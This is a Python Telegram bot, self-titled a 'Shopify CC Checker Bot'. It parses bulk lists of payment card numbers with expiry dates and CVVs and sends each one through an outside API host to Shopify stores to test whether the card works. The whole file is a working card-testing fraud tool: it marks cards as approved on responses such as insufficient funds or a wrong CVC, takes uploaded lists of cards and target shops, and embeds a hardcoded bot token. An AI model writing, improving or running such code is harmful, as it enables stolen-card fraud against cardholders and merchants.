import requests
import json
import time
import os
import re
from datetime import datetime
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode

# ============= CONFIG =============
BASE_URL = "https://scamindian-production.up.railway.app/shopify"
DEFAULT_SITE = "https://greatergoods-com.myshopify.com"

TOKEN = "8856624425:AAHJ1MlxVOGLrTDqmPjbetbyJOaomPS0gXA"   # Hardcoded

APPROVED_RESPONSES = [
    "ORDER_PLACED", "OTP_REQUIRED", "INCORRECT_CVC", "INCORRECT_CVV",
    "INSUFFICIENT_FUNDS", "INCORRECT_ZIP", "INCORRECT_POSTAL_CODE"
]

# Global flag for cancellation
cancel_flags = {}

# =================================

def parse_card_line(line: str):
    line = line.strip()
    if not line:
        return None
    parts = [p.strip() for p in line.split('|')]
    if len(parts) >= 4:
        cc = re.sub(r'\D', '', parts[0])
        mm = re.sub(r'\D', '', parts[1])
        yyyy = re.sub(r'\D', '', parts[2])
        cvv = re.sub(r'\D', '', parts[3])
        if len(cc) >= 13 and len(mm) == 2 and len(yyyy) >= 4 and len(cvv) >= 3:
            return f"{cc}|{mm}|{yyyy}|{cvv}"
    return None


def consultar_api(sitio: str, cc_data: str):
    if not sitio.startswith('http'):
        sitio = 'https://' + sitio
    params = {'site': sitio, 'cc': cc_data}
    try:
        r = requests.get(BASE_URL, params=params, timeout=30)
        return r.text, r.status_code
    except Exception as e:
        return f"Connection Error: {str(e)}", 0


def procesar_respuesta(respuesta_text):
    try:
        if respuesta_text.startswith('{'):
            data = json.loads(respuesta_text)
        else:
            data = {"Response": respuesta_text}
        
        response_type = data.get('Response', 'UNKNOWN')
        if response_type in APPROVED_RESPONSES or data.get('Status') == True:
            return "✅ APPROVED", response_type, str(data)
        else:
            return "❌ DECLINED", response_type, str(data)
    except:
        return "❌ ERROR", "Parse Error", respuesta_text


# ================== COMMANDS ==================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "<b>🛍️ Shopify CC Checker Bot</b>\n\n"
        "Send cards or upload .txt file.\n"
        "Use /cancel to stop checking.",
        parse_mode=ParseMode.HTML
    )


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    cancel_flags[user_id] = True
    await update.message.reply_text("⛔ Checking cancelled by user.")


async def process_cards(update: Update, context: ContextTypes.DEFAULT_TYPE, raw_lines):
    user_id = update.message.from_user.id
    cancel_flags[user_id] = False

    cards = [parse_card_line(line) for line in raw_lines if parse_card_line(line)]
    if not cards:
        await update.message.reply_text("❌ No valid cards found.")
        return

    await update.message.reply_text(f"🔄 Starting check on {len(cards)} cards...\nSend /cancel to stop.")

    sites = context.user_data.get('sites')
    single_site = context.user_data.get('site', DEFAULT_SITE)

    for i, cc in enumerate(cards, 1):
        # Check for cancellation
        if cancel_flags.get(user_id):
            await update.message.reply_text("⛔ Process stopped.")
            break

        if sites:
            for site in sites[:5]:
                if cancel_flags.get(user_id):
                    break
                resp_text, _ = consultar_api(site, cc)
                status, reason, full_resp = procesar_respuesta(resp_text)
                if "APPROVED" in status:
                    await update.message.reply_text(
                        f"{status} | {cc}\nSite: {site}\nReason: {reason}\nFull: <code>{full_resp[:400]}</code>",
                        parse_mode=ParseMode.HTML
                    )
                    break
        else:
            resp_text, _ = consultar_api(single_site, cc)
            status, reason, full_resp = procesar_respuesta(resp_text)
            
            await update.message.reply_text(
                f"{status} | {cc}\n"
                f"Reason: {reason}\n"
                f"Response: <code>{full_resp[:500]}</code>...",
                parse_mode=ParseMode.HTML
            )

        time.sleep(0.8)

    if not cancel_flags.get(user_id):
        await update.message.reply_text("✅ Checking completed.")


# ================== HANDLERS ==================

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    lines = [line.strip() for line in update.message.text.splitlines() if line.strip()]
    await process_cards(update, context, lines)


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    document = update.message.document
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Only .txt files supported!")
        return

    file = await document.get_file()
    file_path = f"temp_{update.message.message_id}.txt"
    await file.download_to_drive(file_path)

    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        lines = [line.strip() for line in f if line.strip()]

    os.remove(file_path)

    if any("myshopify.com" in line for line in lines[:10]):
        context.user_data['sites'] = lines
        await update.message.reply_text(f"✅ Loaded {len(lines)} sites.")
    else:
        await process_cards(update, context, lines)


def main():
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("cancel", cancel))
    app.add_handler(MessageHandler(filters.Document.TEXT, handle_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("🚀 Bot Started with /cancel support")
    app.run_polling()


if __name__ == "__main__":
    main()
